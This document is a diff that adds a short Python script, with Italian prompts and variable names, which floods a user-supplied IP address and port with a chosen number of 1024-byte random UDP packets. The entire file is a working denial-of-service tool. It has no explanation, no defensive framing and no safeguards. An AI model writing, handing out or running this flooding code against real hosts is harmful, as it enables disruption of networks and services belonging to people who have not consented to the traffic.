@@ -1,0 +1,22 @@
+import socket
+import random
+
+
+def genera():
+    return bytes(random.getrandbits(8) for _ in range(1024))   
+                
+def udpflood():
+    ip_target = input("IP Target: ")
+    porta_target = int(input("Porta target: "))
+    pacchetti = int(input("Numero di pacchetti da inviare: "))
+    
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    for i in range(pacchetti):
+        pacchetto = genera()
+        sock.sendto(pacchetto, (ip_target, porta_target))
+    
+    sock.close()
+    print("Invio eseguito")
+
+udpflood()
